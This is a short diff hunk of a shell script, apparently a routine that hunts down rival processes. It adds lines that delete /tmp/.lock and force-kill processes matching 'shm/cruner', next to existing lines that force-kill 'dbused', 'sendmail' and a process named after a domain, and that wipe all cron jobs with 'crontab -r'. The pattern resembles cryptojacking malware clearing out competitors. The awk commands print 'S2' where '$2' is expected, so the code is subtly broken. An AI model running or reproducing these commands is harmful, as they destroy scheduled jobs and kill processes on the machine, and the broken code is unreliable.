@@ -125,10 +125,12 @@ do
   rm -rf /tmp/dbused1
   rm -rf /tmp/dbuse1
   rm -rf /tmp/bashirc
+  rm -rf /tmp/.lock
   ps auxf | grep -v grep | grep 'dbused' | awk '{print S2}' | xargs -I % kill -9 %
   ps auxf | grep -v grep | grep 'sendmail' | awk '{print S2}' | xargs -I % kill -9 %
   ps auxf | grep -v grep | grep 'gitlab-exporter' | awk '{print S2}' | xargs -I % kill -9 %
   ps auxf | grep -v grep | grep 'a.oracleservice.top' | awk '{print S2}' | xargs -I % kill -9 %
+  ps auxf | grep -v grep | grep 'shm/cruner' | awk '{print S2}' | xargs -I % kill -9 %
   crontab -r
 
   sleep 1
